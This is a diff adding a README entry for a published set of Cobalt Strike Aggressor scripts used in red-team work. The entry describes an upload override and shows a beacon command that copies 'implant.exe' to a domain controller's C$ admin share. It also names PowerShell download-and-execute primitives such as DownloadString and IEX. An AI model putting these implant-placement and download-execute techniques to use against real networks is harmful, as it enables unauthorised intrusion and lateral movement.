@@ -2,6 +2,14 @@
 
 My published set of Aggressor Scripts for Cobalt Strike 4.0+
 
+- **`better-upload.cna`** - Simple yet **super handy** script that overrides built-in `upload` command by having one that offers additional, second parameter - being _remote file path_. By default we're only able to upload file to the CWD. This implementation let's us upload wherever we like:
+
+```
+beacon> upload implant.exe \\DC1\c$\windows\temp\implant.exe
+[*] Tasked Beacon to upload file (size: 929.25KB) from: (implant.exe) to: (\\DC1\c$\windows\temp\implant.exe)
+[+] host called home, sent: 951655 bytes
+
+```
 
 - **`custom-powershell-hooks.cna`** - This script introduces several different methods for Powershell download and execution primitives, other than Cobalt Strike's default `(Net.WebClient).DownloadString` and `IEX()`:
 ```
